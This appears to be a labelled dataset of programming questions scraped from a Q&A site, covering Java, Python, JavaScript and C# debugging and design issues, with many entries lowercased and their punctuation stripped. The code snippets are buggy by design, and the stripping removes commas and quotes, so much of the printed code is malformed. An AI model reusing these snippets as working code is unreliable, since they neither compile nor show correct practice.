  is there something i have forgotten to add,java

"I have upgraded my project to target C# 7 and used Visual Studio 2017 RC to implement pattern matching across my solution. After doing this some errors were introduced relating to pattern matching with generic parameters.

Consider the following code:

<pre><code>public class Packet
{
}

public class KeepalivePacket : Packet
{
}

public void Send&lt;T&gt;(T packet)
    where T : Packet
{
    if (packet is KeepalivePacket keepalive)
    {
        // Do stuff with keepalive
    }

    switch (packet)
    {
        case KeepalivePacket keepalivePacket:
            // Do stuff with keepalivePacket
            break;
    }
}
</code></pre>

Both the <code>if</code> statement and the <code>case</code> statement produce a compilation error.

<blockquote>
  An expression of type T cannot be handled by a pattern of type KeepalivePacket
</blockquote>

If I first cast the parameter to type <code>object</code> the pattern matching works as expected. Roslyn then marks the cast to <code>object</code> as redundant.

<pre><code>if ((object)packet is KeepalivePacket keepalive)
{
    // This works
}
</code></pre>

This error only appears to apply to generic parameters and variables. Roslyn appears to not be aware of this issue as it recommends changing the code to use pattern matching via an analyzer and allows me to apply the code fix resulting in the broken code.

java variable scope strange behavior  i should replace the old population with the new one but the java program has a very strange behavior. here is my code snippet:   <pre><code>population newpopulation = new population(population.size());      // loop over current population by fitness     for (int populationindex = 0; populationindex &lt; population.size(); populationindex++) {         individual parent1 = population.getfittest(populationindex);          // apply crossover to this individual         if (this.crossoverrate &gt; math.random() &amp;&amp; populationindex &gt; this.elitismcount) {              // initialize offspring             individual offspring = new individual(parent1.getchromosomelength());             // find second parent             individual parent2 = selectparent(population);              // loop over genome             for (int geneindex = 0; geneindex &lt; parent1.getchromosomelength(); geneindex++) {                 // use half of parent1 s genes and half of parent2 s genes                 if (0.5 &gt; math.random()) {                     offspring.setgene(geneindex  parent1.getgene(geneindex));                 } else {                     offspring.setgene(geneindex  parent2.getgene(geneindex));                 }             }              // add offspring to new population             newpopulation.setindividual(populationindex  offspring);         } else {             // add individual to new population without applying crossover             newpopulation.setindividual(populationindex  parent1);         }     } </code></pre>   the implementation of the last <code>setindividual()</code> method:   <pre><code>public individual setindividual(int offset  individual individual) {     return population[offset] = individual; } </code></pre>   in the <code>loop over genome</code> (check the comment in the code) i change the value of the <code>offspring</code>. i can see in debugger that the value changes  but after the code leaves the <code>genome loop</code> and goes to the following line of code:   <pre><code>newpopulation.setindividual(populationindex  offspring); </code></pre>   i see in debugger (intellij evaluate expression window) that offspring is undefined variable  and the value of newpopulation does not change.    what may be the problem  in my opinion everything should work,java
"<pre><code>private void GetTimeBetween()
        {
            DateTime a = new DateTime(2010, 04, 24, 13, 10, 00);
            DateTime b = new DateTime(2010, 04, 25, 13, 10, 00);
            Console.WriteLine(b.Subtract(a).TotalMinutes);
            double d = b.Subtract(a).TotalMinutes;
        }
</code></pre>

I'm getting TotalMinutes 1440

But how can i make now that it will create a List with all the dates and time between this two dates between a and b but in jumps of 10 minutes ?

For example in the List the first item will be:

24/4/2010 13:10:00

Then ext item will be

24/4/2010 13:20:00

And so on until b

25/4/2010 13:10:00

In this format in the List or in other formats but the idea to get all the dates+time between the two given dates.

use of  this  keyword in java  i was studying  method overriding in java when ai came across the <code>this</code> keyword. after searching much about this on the internet and other sources  i concluded that the<code>this</code> keyword is used when the name of an instance variables is same to the constructor function  parameters. am i right or wrong,java
"I am developing a game with a concept of tetris, But in my game what I want to clear is a rectangular formed by the player instead of row or line. Like for example I instantiate that the blocks will be cleared if there is a 4 rows and 5 columns filled of tetris blocks on the grid.
[Like this. Instead of line, a rectangle formed will be the one to be clear][1]

So far this is my code that deletes a row.

dynamically loading modules in python (+ multi processing question)  i am writing a python package which reads the list of modules (along with ancillary data) from a configuration file.    i then want to iterate through each of the dynamically loaded modules and invoke a do_work() function in it which will spawn a new process  so that the code runs asynchronously in a separate process.    at the moment  i am importing the list of all known modules at the beginning of my main script - this is a nasty hack i feel  and is not very flexible  as well as being a maintenance pain.    this is the function that spawns the processes. i will like to modify it to dynamically load the module when it is encountered. the key in the dictionary is the name of the module containing the code:   <pre><code>def do_work(work_info):   for (worker  dataset) in work_info.items():     #import the module defined by variable worker here...      # [edit] not using threads anymore  want to spawn processes asynchronously here...      #t = threading.thread(target=worker.do_work  args=[dataset])     # i ll not dameonize since spawned children need to clean up on shutdown     # since the threads will be holding resources     #t.daemon = true     #t.start() </code></pre>   <strong>question 1</strong>    when i call the function in my script (as written above)  i get the following error:   <blockquote>    attributeerror:  str  object has no   attribute  do_work   </blockquote>   which makes sense  since the dictionary key is a string (name of the module to be imported).    when i add the statement:    <strong>import worker</strong>    before spawning the thread  i get the error:   <blockquote>    importerror: no module named worker  </blockquote>   this is strange  since the variable name rather than the value it holds are being used - when i print the variable  i get the value (as i expect) whats going on     <strong>question 2</strong>    as i mentioned in the comments section  i realize that the do_work() function written in the spawned children needs to cleanup after itself. my understanding is to write a clean_up function that is called when do_work() has completed successfully  or an unhandled exception is caught - is there anything more i need to do to ensure resources don t leak or leave the os in an unstable state     <strong>question 3</strong>    if i comment out the t.daemon flag statement  will the code stil run asynchronously . the work carried out by the spawned children are pretty intensive  and i don t want to have to be waiting for one child to finish before spawning another child.  btw  i am aware that threading in python is in reality  a kind of time sharing/slicing  - thats ok    lastly is there a better (more pythonic) way of doing what i m trying to do     <strong>[edit]</strong>    after reading a little more about pythons gil and the threading (ahem - hack) in python  i think its best to use separate processes instead (at least iiuc  the script can take advantage of multiple processes if they are available)  so i will be spawning new processes instead of threads.    i have some sample code for spawning processes  but it is a bit trivial (using lambad functions). i would like to know how to expand it  so that it can deal with running functions in a loaded module (like i am doing above).    this is a snippet of what i have:   <pre><code>def do_mp_bench():     q = mp.queue() # not only thread safe  but  process safe      p1 = mp.process(target=lambda: q.put(sum(range(10000000))))     p2 = mp.process(target=lambda: q.put(sum(range(10000000))))      p1.start()     p2.start()     r1 = q.get()     r2 = q.get()     return r1 + r2 </code></pre>   how may i modify this to process a dictionary of modules and run a do_work() function in each loaded module in a new process,python
multiple variable for if else statement  i have written some code to check if the user has entered a number between 1 and 5  and now i would also like my code to allow the user to enter the letters a  s  d or m.    is there a way to combine the code where i can have it identify whether the user has entered 1-5 or a  s  d  m     how do i edit the code below so the user can enter either an integer or a character  do i have to write a snippet of code underneath the loop for it to identify that a user did not enter 1-5 but did enter a  s  d  or m  as in break out of the loop  or is it a separate loop all together. i am so confused!   <pre><code>import java.util.inputmismatchexception; import java.util.scanner;  public class selection {     scanner readinput = new scanner(system.in);      int selectionone() {         int inputint;         do { //do loop will continue to run until user enters correct response             system.out.print( please enter a number between 1 and 5  a for addition  s for subtraction  m for multiplication  or d for division:  );             try {                  inputint = readinput.nextint(); //user will enter a response                 if (inputint &gt;= 1 &amp;&amp; inputint &lt;=5) {                     system.out.print( thank you );                     break; //user entered a number between 1 and 5                 } else {                     system.out.println( sorry  you have not entered the correct number  please try again. );                 }                 continue;             }             catch (final inputmismatchexception e) {                 system.out.println( you have entered an invalid choice. try again. );                 readinput.nextline(); // discard non-int input                 continue; // loop will continue until correct answer is found             }         } while (true);         return inputint;     }  } </code></pre>,java

why do i keep getting index out of range  i m working through the checkio site and have encountered a problem that i don t understand. the input is an array of ones and zero s plus 2 co ordinates. i need to write a function to return how many ones are in a circle to my co ordinates  not counting the one i m on. i keep getting index out of range  which it is but i thought the  try:  except index error:   bit of my code would ignore it and move onto the next iterable. it works with the other examples the site gives  which do have other places where i m out of range but the code skips it and moves on. just the last test that fails and i cant figure it out. i ve had a good search and can t see the problem. at first i had the  try  inside the  for  loop but it wasn t getting that far. i felt like the except should be inside the for loop but every example i ve seen its on the same level as the  try  if you help me you are mega cool. :)  here s the code with the example i m getting stuck at.   <pre><code>def count_neighbours(grid  row  col):      count = 0     a = row - 1     b = row + 1     c = col - 1     d = col + 1     order = [grid[a][c]  grid[a][col]  grid[a][d]               grid[row][c]  grid[row][d]               grid[b][c]  grid[b][col]  grid[b][d]]      try:         for z in order:             count += z     except indexerror:         pass     return count   count_neighbours(((1  1  1) (1  1  1) (1  1  1))  0  2) </code></pre>,python

strange behavior with java strings  i have two string variables ticker and detail. i m trying to print out the two strings in one line. it just wouldn t work. i ve tried so many different ways of doing this. to exclude the possibility of an uninitialized string i tried printing them out in different lines ... this works.    this example works ... except that the output needs to be in one line.   <pre><code>            system.out.println(ticker);             system.out.println(detail); </code></pre>   and the output is:   <pre><code>iwm |0#0.0|0#0.0|0#-4252#386| gld |0#0.0|0#0.0|0#-4704#818| </code></pre>   when i try to put the output into one line in any of many ways  i get only the ticker ... the detail string is just not printed ... not to console or to file. here are some example code snippets that produce the same result:    attempt 1:   <pre><code> system.out.println(ticker.concat(detail)); </code></pre>   attempt 2:   <pre><code>system.out.println(ticker+detail); </code></pre>   attempt 3:   <pre><code>stringbuffer sb = new stringbuffer(); sb.append(ticker); sb.append(detail); system.out.print(sb.tostring()); </code></pre>   attempt 4:   <pre><code>system.out.print(ticker); system.out.println(detail); </code></pre>   in all the above attempts  i get the following output ... as if the detail part is ignored:   <pre><code>gold bbl si </code></pre>   what could be causing these symptoms  is there a way to get the two strings printed in one line,java

javascript getting an array from an array in an object  i have an object <code>myobject</code> and one of its properties <code>itemids</code> is an array of ints. i want to get a new array <code>pageitemids</code> that contains only part of the ints. it s for a pager; i pass in the page number <code>pagenumber</code> and i get the ids of the items on the page. suppose the page size is 20 items.    this is what i tried. it doesn t work because js works with references so i end up changing the array of the object.   <pre class= lang-js prettyprint-override ><code>pageitemids = myobject.itemsid; pageitemids = pageitemids.splice(pagenumber * 20  20); </code></pre>   and instead of getting the itemids in the page  i end up with the itemids not in the page.    i know i m not that far off but if you can help that d be nice.    thanks.    edit:    when i do   <pre><code>pageitemids = pageitemids.slice((pagenumber -1) * 20  20); </code></pre>   it works for page 1 but for every other page  it returns an empty array.    ok  i got it  nevermind.   <pre><code> pageitemids = pageitemids.slice(pagenumber * 20  pagenumber * 20); </code></pre>,javascript

"I'm making the transition from NUnit to XUnit (in C#), and I was writing some Integrated Tests (ITs) that I don't necessarily want the test runner to run as part of my automated build process. I typically do this for manually testing, when the full end to end process might not work because of environmental factors (missing data, etc.)

In NUnit, you could mark a test with the <a href=http://www.nunit.org/index.php?p=explicit&amp;r=2.4.8 rel=noreferrer>Explicit attribute</a> and it would just get skipped by the test runner (unless you marked the test with a specific <a href=http://www.nunit.org/index.php?p=category&amp;r=2.4.8 rel=noreferrer>Category attribute</a> and told the test runner to target that category explicitly). 

Does XUnit have a similar way to exclude tests from the test runner?

"Suppose I have a C# controller that calls into some arbitrary function that returns a Task (for instance because it performs a database transaction). Should I always use async and await, or should I just return the task?

Example controller:

<pre class=lang-cs prettyprint-override><code>public async Task&lt;string&gt; DoSomething() {
    return await SomeOtherFunctionThatReturnsATask();
}
</code></pre>

Should I change this into:

<pre class=lang-cs prettyprint-override><code>public Task&lt;string&gt; DoSomething() {
    return SomeOtherFunctionThatReturnsATask();
}
</code></pre>

Or does it really not matter?

How would you do it if you would copy (not remove) 5 random objects into random positions. From Filled to Empty. There can be duplicates just as long as its randomly done.

what could error in this java program to compute sine   i have written this code to compute the sine of an angle. this works fine for smaller angles  say upto +-360. but with larger angles it starts giving faulty results. (when i say larger  i mean something like within the range +-720 or +-1080)    in order to get more accurate results i increased the number of times my loop runs. that gave me better results but still that too had its limitations.    so i was wondering if there is any fault in my logic or do i need to fiddle with the conditional part of my loop  how can i overcome this shortcoming of my code  the inbuilt java sine function gives correct results for all the angles i have tested..so where am i going wrong     also can anyone give me an idea as to how do i modify the condition of my loop so that it runs until i get a desired decimal precision    <pre><code>import java.util.scanner;   class sinefunctionmanual  {     public static void main(string a[])     {         system.out.print( enter the angle for which you want to compute sine :  );          scanner input = new scanner(system.in);             int degreeangle = input.nextint();  //angle in degree.         input.close();          double radianangle = math.toradians(degreeangle);   //sine computation is done in terms of radian angle         system.out.println(radianangle);         double sineofangle = radianangle prevval = radianangle; //sineofangle contains actual result  prevval contains the next term to be added         //double fractionalpart = 0.1;  // this variable is used to check the answer to a certain number of decimal  places  as seen in the for loop          for(int i=3;i&lt;=20;i+=2)         {             prevval = (-prevval)*((radianangle*radianangle)/(i*(i-1)));     //x^3/3! can be written as ((x^2)/(3*2))*((x^1)/1!)  similarly x^5/5! can be written as ((x^2)/(5*4))*((x^3)/3!) and so on. the negative sign is added because each successive term has alternate sign.             sineofangle+=prevval;              //int ipart = (int)sineofangle;             //fractionalpart = sineofangle - ipart; //extracting the fractional part to check the number of decimal places.         }          system.out.println( the value of sin of  +degreeangle+  is :  +sineofangle);      }  } </code></pre>,java

is it bad form to treat argument names the same as variable names in javascript   whenever i define a function in javascript  i frequently name the place holder what i would like them to be. this leads to the problem that  declaring those arguments as variables in the function makes them have the same name. is this a problem (because i do not often see it done).    for example:   <pre><code>var words =  hello there ;  var talk = function talk (words) {   // realizing this does nothing  i am leaving it in because other answers refer to it.   var words = words;  //i suppose this could also be this.words = words   console.log(words); }  talk(words); //to log  hello there  </code></pre>   this is an extreme example  but in many instances it seems like this would make more sense than using similar and not quite correct words (like <code>var letters = words</code>),javascript

"Advice needed, please!

I am about to start writing a C# Web Forms application that will utimately store forms data (i.e. Textbox, dropdown list and values, their position in the form, default values etc) in JSON format within an SQL database. This JSON data will then be called via an API by an app (Android / iOS) and then render said JSON into a form onto the device, in order for the user to complete. They will then submit this completed form via another API endpoint and it will be stored within the database.

So,

1) Will this work? I am very unfamiliar with JSON, iOS and Android development
2) Is there a better way of doing this?

Any advice appreciated!

getting the wrong answer (monte carlo) for estimation of pi  i am trying to estimate the value of pi using a monte carlo simulation. i need to use two unit circles that are a user input distance from the origin. this is what i have:   <pre><code>import random import math import sys  def main():     numdarts=int(sys.argv[1])     distance=float(sys.argv[2])     print(montepi(numdarts distance))  def montepi(numdarts distance):     width=2*(1-distance)     if distance&gt;=1:         return(0)     incircle=0     for i in range(numdarts):         x=(width*(random.random()))-width           y=(random.random())         d=(x-distance)**2+(y-0)**2         d2=(x-(distance*-1))**2+(y-0)**2         if d&lt;=1 and d2&gt;=-1:             incircle=incircle+1     pi=(incircle/numdarts)*(width*2)     return pi  main() </code></pre>   this is what i should get-    when distance = 0  about 3.14 when distance = .5  about 1.288 i am getting about 1.6 and .6 respectively  why     these are my instructions-    write a program called mcintersection.py that uses the monte carlo method to estimate the area of this shape (and prints the result). your program should take two command-line parameters: distance and numdarts. the distance parameter specifies how far away the circles are from the origin on the x-axis. so if distance is 0  then both circles are centered on the origin  and completely overlap. if distance is 0.5 then one circle is centered at (-0.5  0) and the other at (0.5  0). if distance is 1 or greater  then the circles do not overlap at all! in that last case  your program can simply output 0. the numdarts parameter should specify the number of random points to pick in the monte carlo process.    in this case  the rectangle should be 2 units tall (with the top at y = 1 and the bottom at y = -1). you could also safely make the rectangle 2 units wide  but this will generally be much bigger than necessary. instead  you should figure out exactly how wide the shape is  based on the distance parameter. that way you can use as skinny a rectangle as possible.,python

raytracer  computing viewing rays (java)  for school  i have recently started creating my own raytracer. however  i ve hit a snag with either computing the viewing rays  or checking for an intersection between a triangle and a ray. as far as i can tell  the computations seem to be executed correctly  as i place my camera in the origin and have it face the -z axis towards an object right in front of it  allowing for simple vector maths by hand. everything seems to check out  but nothing gets painted on the screen.    i will post the code i am using the calculate the viewing rays.   <pre><code>public ray generateray(float nx  float ny   point2f coordinates) {     // compute l  r  b and t.     vector3f temp = vectorhelper.multiply(u  nx/2.0f);     float r = temp.x + position.x;     temp = vectorhelper.multiply(u  -nx/2.0f);     float l = temp.x + position.x;     temp = vectorhelper.multiply(v  ny/2.0f);     float t = temp.y + position.y;     temp = vectorhelper.multiply(v  -ny/2.0f);     float b = temp.y + position.y;      // compute the u and v coordinates.     float uco = (l + (r - l) * (coordinates.x + 0.5f)/nx);     float vco = (b + (t - b) * (coordinates.y + 0.5f)/ny);      // compute the ray s direction.     vector3f raydirection = vectorhelper.multiply(w  -focallength);     temp = vectorhelper.add(vectorhelper.multiply(u  uco)  vectorhelper.multiply(v  vco));     raydirection = vectorhelper.add(raydirection  temp);     raydirection = vectorhelper.add(raydirection  position);     raydirection = vectorhelper.normalize(vectorhelper.add(raydirection  temp));      // create and return the ray.     return new ray(position  raydirection); } </code></pre>   the following code is what i use to calculate an intersection. it uses cramer s rule to solve the matrix equation.   <pre><code>public static point3f raytriangleintersection(         ray ray  point3f vertexa  point3f vertexb  point3f vertexc) {     // solve the linear system formed by the ray and the parametric surface     // formed by the points of the triangle.     // | a d g |   | b |   | j |     // | b e h | * | y | = | k |     // | c f i | * | t | = | l |     // the following uses cramer s rule to that effect.     float a = vertexa.x - vertexb.x; float d = vertexa.x - vertexc.x; float g = ray.getdirection().x;     float b = vertexa.y - vertexb.y; float e = vertexa.y - vertexc.y; float h = ray.getdirection().y;     float c = vertexa.z - vertexb.z; float f = vertexa.z - vertexc.z; float i = ray.getdirection().z;      float j = vertexa.x - ray.getorigin().x;     float k = vertexa.y - ray.getorigin().y;     float l = vertexa.z - ray.getorigin().z;      // compute some subterms in advance.     float eihf = (e * i) - (h * f);     float gfdi = (g * f) - (d * i);     float dheg = (d * h) - (e * g);     float akjb = (a * k) - (j * b);     float jcal = (j * c) - (a * l);     float blkc = (b * l) - (k * c);     // compute common division number.     float m = (a * eihf) + (b * gfdi) + (c * dheg);      // compute unknown t and check whether the point is within the given     // depth interval.     float t = -((f * akjb) + (e * jcal) + (d * blkc)) / m;     if (t &lt; 0)         return null;      // compute unknown gamma and check whether the point intersects the     // triangle.     float gamma = ((i * akjb) + (h * jcal) + (g * blkc)) / m;     if (gamma &lt; 0 || gamma &gt; 1)         return null;      // compute unknown beta and check whether the point intersects the     // triangle.     float beta = ((j * eihf) + (k * gfdi) + (l * dheg)) / m;     if (beta &lt; 0 || beta &gt; (1 - gamma))         return null;      // else  compute the intersection point and return it.     point3f result = new point3f();     result.x = ray.getorigin().x + t * ray.getdirection().x;     result.y = ray.getorigin().y + t * ray.getdirection().y;     result.z = ray.getorigin().z + t * ray.getdirection().z;     return result; } </code></pre>   my question is rather simple. what am i doing wrong  i ve looked and debugged this code to death and cannot single out the errors  google offers little more than the theory i already have in the book i am using. also  the code is still rather rough as i m just focusing on getting it to work before cleaning it up.    thanks in advance     kevin,java

change default java installation  i have many java versions installed on a windows 7 machine. some of them are 32 bits  some are 64 bits. now as default it starts one of those last versions (1.7 64 bits). how do i tell  my windows 7 machine to use another version of java  one of the reasons is that i m developing a jni project from microsoft visual studio c++ - it uses also java 1.7 64 bits.    best regards  andrej    i have set:     user variable: java_home=c:\j2sdk1.4.2_04 path=%java_home%\bin;%path%    and system variable: java_home=c:\j2sdk1.4.2_04 path=...a_lot_of_paths...;%java_home%\bin;%path%    i had no idea which is better to set - for user or system settings. done both.    system restart.    and...it didn t helped :( when i run  java -version  from cmd i have java 1.7  but not java 1.4 like defined in path.    after run c:>where java i got two results:    c:\windows\system32\java.exe c:\j2sdk1.4.2_04\bin\java.exe    who let java go to my windows directory    !!!     how to deal with that,java
"I'm trying to encode an image into a byte array and send it to a server.
the encoding and sending parts wok fine but my problem is that the byte array is too large and takes too long to send so I thought compressing it would make it go faster. but the actual problem is that I CAN NOT use system.io or streams. and I'm targeting .net 2.0.
Thank you.

shared variable scope between two browser tabs   i have web application with a html form which contains a select/option entry. it worked fine in a demo with 200 items  even if it s clumsy to find the one you want  but in reality there are over 30000 items. (it s a parts list.)    my first thought is have  instead of a drop down box  to have a  choose part  button and this opens a second browser tab ( search parts ) and then the full list displayed  search capabilities etc  each with a  copy to clipboard  button. then the user can press one and go back to the original form and press a  paste  button and the name of the part will be entered into the form.    what i am asking is  is there a javascript scope in which i can store a small text field and id number in the  search parts  tab so that i could get retrieve it when the user presses a  paste  button on the main form page  i don t want to send messages back to the server.    (btw i m not necessarily interested in implementing ctrl+c/v or using the system clipboard  unless that s part of an easy solution.)    thanks!,javascript

javascript functions - why does this work   i ve been doing server-side coding for some years  namely in python  shell  and more recently  java.  although i ve done some client-side javascript  i ve never dug too deeply.    until i found node.js and the stacks surrounding it.  now i m entranced.  i m trying desperately to understand asynchronous programming and callback functions.  i am making progress  but then i found something that threw me back into the land of utter confusion and despair.   <pre><code>var add = new function( num1    num2    return num1 + num2 ); console.log(add(1  2));  outputs: 3 </code></pre>   can anyone explain to me like i m 5  why and how this works   the way i see it is  a function called  add  takes three parameters.  i pass numbers to the first two  but the last parameter is actual code.  yes  i sort of understand that javascript functions are actually objects that contain strings of code (that hurt my brain a lot).  however  what causes the third parameter to  trigger.   how does js know to execute the third parameter as if it were a line in the function itself  not a parameter.    argh... sorry for the dumb question.  no  this is not a homework assignment  i m old.  it isn t even for a real work project  i just like digging into stuff like this and this one is causing virtual tears.    thanks  tr,javascript

guessing game with minimum guesses used not working in java  i m creating a guessing game in java using netbeans. the guessing game allows the user to guess a number between 1 and 10. each round they have 5 chances to guess the number. there are three rounds in the game. after the user finishes the game  stats are outputted with the minimum # of guess and maximum # of guesses.     the minimum guesses isn t working and it always outputs 1. right now  i have the program set up so that it keeps track of how many times the user guesses per round. after each round  it compares this value to the min value and max value. the minguess is set as 5 since it isn t possible to guess more than 5 times. the maxguess is set as 1 since they will always guess one time or more than one time.    <pre><code>static void numberguess(int guess  int randnum) {                              //creating a method to check if the user has guessed the correct number or if the guess should be higher or lower  if (guess &lt; 0 | guess &gt; 10) {     system.out.println( please enter a valid number between 1 and 10. );  } else if (guess == randnum) {     system.out.println( you guessed the number correctly ); } else if (guess &lt; randnum) {     system.out.println( guess is too low ); } else if (guess &gt; randnum) {     system.out.println( guess is too high ); }     }  /**  * @param args the command line arguments  */ public static void main(string[] args) {    /*rational:  this program allows a user to guess a number between 1 and 10 five times per round. there are three rounds in one game.                  the program then outputs the stats for the game.      */    //declaration     int userguess;            //creates a spot in memory for these variables     int numofguess = 0;     int invalidguess = 0;     int minguess = 5;     int maxguess = 1;     int average;      scanner input = new scanner (system.in);  //creates an object in the scanner clas    //execution    system.out.println( welcome to super guessing game! guess a random number between 1 and 10. there are three rounds with one guess each. );    loopone:                                     //labels the loop as looptwo    for (int x = 1;  x &lt;= 3; x= x + 1 ) {        //runs the loop for three rounds         system.out.println(   );        system.out.println( round   + x);        system.out.println( to exit the game at any point  enter a negative 1 );        system.out.println(   );         int randnum;        randnum = 1 + (int)(math.random() * ((10 - 1) + 1));     //generates the random number           looptwo:                                        //labels the loop as looptwo        for (int y = 1; y &lt;= 5; y= y + 1) {             //runs the loop five times (five guesses per round)            numofguess = numofguess + 1;               //counts number of guesses user has made            system.out.println( guess   + y +   out of 5 );            system.out.println( please guess a number between 1 and 10:  );            userguess = input.nextint();            if (userguess == -1){                       //sentinel to let the user quit at any time            system.out.println( thank you for playing );            break loopone;                             //breaks out of the loops if the user wants to stop playing            }             numberguess(userguess  randnum);      //calls the numberguess method            if (y &lt; minguess)                    //compares to see if the minimum number of guesses is less that the number of guesses the user has made this round                minguess = y;             if (y &gt; maxguess)                    //compares to see if the maximum number of guesses is greater than the number of guesses that the user has made this round                 maxguess = y;                if (userguess &lt;1 | userguess &gt; 10) {      //keeps track of invalid guesses                invalidguess = invalidguess + 1;             }             if (userguess == randnum) {            //exits the round if the user guesses correctly                break;             }        }     }    average = numofguess / 3;              //calculates the average number of guesses    system.out.println( thanks for playing! );     //outputs the following     system.out.println(  );    system.out.println( number of guesses made:   + numofguess);     system.out.println( average number of guesses:   + average);      system.out.println( number of invalid guesses:   + invalidguess);    system.out.println( minimum guesses used:   + minguess);    system.out.println( maximum guesses used:   + maxguess);  } </code></pre>   },java

But what wrong happening here is, Each and every user is able to see all the data in the Excel sheet.

It should be like, the user can only be able to see it's own data only. For ex:

For Ex: Chetan Mody should be able to see only two rows in excel sheet, but he is able to view all the records which is wrong.

passing option constants as arguments to a class  i have a python class that takes an arguments to set the state of an object. this argument must be one option in a list of available options; for example  a traffic light can either be red  green or orange.     i have two approaches to handle this problem. i can use a string to set the state  but then i ll have to do additional error checking and it is unclear without looking at the code what states are available. alternatively i can create a class that acts as an enum.     which of these methods (or what other method) should i use     example with strings:   <pre><code>class light(object):      def __init__(self  color):         self.color = color      def turn_on(self):         if self.color ==  red :             self.turn_on_red_light()         if self.color ==  green :             self.turn_on_green_light()         if self.color ==  orange :             self.turn_on_orange_light()      def turn_on_red_light():         # do stuff         return      def turn_on_green_light():         # do stuff         return      def turn_on_orange_light():         # do stuff         return  light = light( red ) light.turn_on() </code></pre>   alternative using simple  enum :   <pre><code>class colors(object):     red  green  orange = range(3)  class light(object):     def __init__(self  color):         self.color = color      def turn_on(self):         if self.color == colors.red:             self.turn_on_red_light()  # as above         if self.color == colors.green:             self.turn_on_green_light()  # as above         if self.color == colors.orange:             self.turn_on_orange_light()  # as above  light = light(colors.red) light.turn_on() </code></pre>   maybe this is not the best example as you can just call <code>light.turn_on_red_light()</code>  but then that logic to decide what function to call must sit somewhere else. let s pretend that is not an option.    i come across this situation often. frequently i use it to define  settings  within the class. i d be interested to know what is the preferred method in python or any other ways it can be improved,python

pythonic way of returning none if input itself is none   what s the best way to write a <em>null-check</em> in python  <code>try-except</code> blocks  <code>if</code> blocks...     given a function that returns <code>none</code> if the input is <code>none</code>  a valid input  what s the best approach to deal with this situation  take this function for example:   <pre><code>def urlify(path):     if path is none:         return none      return  &lt;a href=\ {0!s}\ &gt;{0!s}&lt;/a&gt; .format(path) </code></pre>,python
java htmlunit cookies and apache cookies - compatible   i need to make the cookies from <code>org.apache.http.cookie.cookie</code> compatible with cookies from <code>com.gargoylesoftware.htmlunit.util.cookie</code>.    can you use those 2 cookies interchangeably  if not  how can i store both of those types of cookies within the same container,java

"Following [this guide][1] I wrote the following function:

        public string ConnectToHost(string ip, int port)
        {
            Socket socket = new Socket(SocketType.Stream, ProtocolType.Tcp);

            IPAddress host = IPAddress.Parse(ip);
            IPEndPoint ipep = new IPEndPoint(host, port);

            socket.Connect(ipep);

            byte[] msg = Encoding.Unicode.GetBytes(<Client Quit>);
            int msgSend = socket.Send(msg);

            byte[] bytes;
            int byteRecieve;

            String msgRecieved = Encoding.Unicode.GetString(bytes, 0, byteRecieve);
            while (socket.Available > 0)
            {
                byteRecieve = socket.Receive(bytes);
                msgRecieved += Encoding.Unicode.GetString(bytes, 0, byteRecieve);
            }

            socket.Shutdown(SocketShutdown.Both);
            socket.Close();

            return msgRecieved;
        }

But I get error Use of unassigned local variable 'bytes' and Use of unassigned local variable 'byteRecieve' at `String msgRecieved = Encoding.Unicode.GetString(bytes, 0, byteRecieve);`

Removing the `Encoding.Unicode.GetString(bytes, 0, byteRecieve);` from the line and only have `String msgRecieved;` gave the same error but within the `while` loop.

How do I get this function to return the recieved bytes as string?

some questions about the  append  function in python  i ve met a problem when using the append function of python. if i code like this:   <pre><code>a={} a[1]=[1] b=copy(a) b[1].append(2) print (a) </code></pre>   the result will be:   <pre><code>{1: [1  2]} </code></pre>   why  i think that using the copy function  the address of anything related to b will not influence a. but this append function is really strange! could anyone please tell me how this works  how could i append something without influencing the original address  thanks a lot!,python

"i dont know whether this question will end up as a dumb question, 
but, it disturbing me.
So im reading some articles that emphasize the need of property to encapsulate fields in a class, 
if the property can store data (as field does) why do we still need field?
for example i have this class, 

    public class Music
    {
        public Music() { }
        public float musicBPM { get; set; } 
        public void addBPM()
        {
            this.muscBPM +=10;
        }
    }

its still working like as i have a private field and change its value , right?
so, whats the critical need of field if you can use the property?",c#

"Just curious, is changing the size of a struct/value type a breaking change in C#? Structs tend to be more sensitive in terms of memory layout since altering them directly affects the size of arrays/other structs. Are there any examples of code that breaks, either binary-wise or source-wise, after the layout of a struct in a library it uses is changed?

NOTE: By breaks, I mean it fails to compile at all or the IL is invalidated. So for example I wouldn't consider this a breaking change:

<pre><code>// My.Library v1
public struct MyStruct {}

// My.Library v2
public struct MyStruct { int _field; }

// App code
using My.Library;
using System.Runtime.InteropServices;

Console.WriteLine(Marshal.SizeOf&lt;MyStruct&gt;()); // before printed 1, now prints 4
</code></pre>

because it still runs.

Essentially what i want is something like 7zip. You can either use 7zip file manager and right click items to zip it there, OR you can right click on any item outside 7zip, say a folder in desktop, and have the option of using 7zip.

how to convert a stringbuilder of integers into an array of ints   so for an assignment i had to write a method that would take two arrays and interleave them. i chose to convert those arrays to strings  take substrings of each string and add them to a stringbuilder. now i should have a stringbuilder full of integers from both arrays  but the method the teacher wants us to create must return an array of ints. how can i convert this stringbuilder to an array of ints     here s my code so far:   <pre><code>public static int[] interleavearrays(int[] array1  int[] array2  int stride  int maxelements){      if (stride &lt;= 0){         return null;     }     if (maxelements &lt;= 0){         return null;     }      string arraya = array1.tostring();     string arrayb = array2.tostring();     stringbuilder sb = new stringbuilder(array1.length + array2.length);      boolean done = false;     boolean end = false;     int i = 0;     int j = 0;      while (done = false){//create a substring of the first array &amp; append to stringbuilder         string newarray1 = arraya.substring(i  i + (stride - 1));         sb.append(newarray1);         if (i &gt; arraya.length()){             done = true;         }         while (end = false){//create a substring of the second array &amp; append to stringbuilder             string newarray2 = arrayb.substring(j  (j + stride - 1));             sb.append(newarray2);             if (j &gt; arrayb.length()){                 end = true;             }         }         if (sb.length() &gt;= maxelements){             done = true;         }     } } </code></pre>   (side note:    <strong>stride</strong> is the amount of integers that should be taken at a time from each array.

operator precedence and associativity with math.floor(math.random())  i understand how the code works  in terms of the results it gives.  first  it gets a random number  and  second  using math.floor() it rounds down the results of math.random. therefore  it s moving from right to left through the code.    <pre><code>math.floor(math.random * num); </code></pre>   in the javascript reference at this  <a href= http://www.javascriptkit.com/jsref/precedence_operators.shtml  rel= nofollow noreferrer >url</a> and shown in the image below <img src= https://i.stack.imgur.com/hgyks.png  alt= url >    it says that  for dot and parentheses  the associativity is  left to right . however  based on the code i excerpted above  i d say it was  right to left.  please explain,javascript

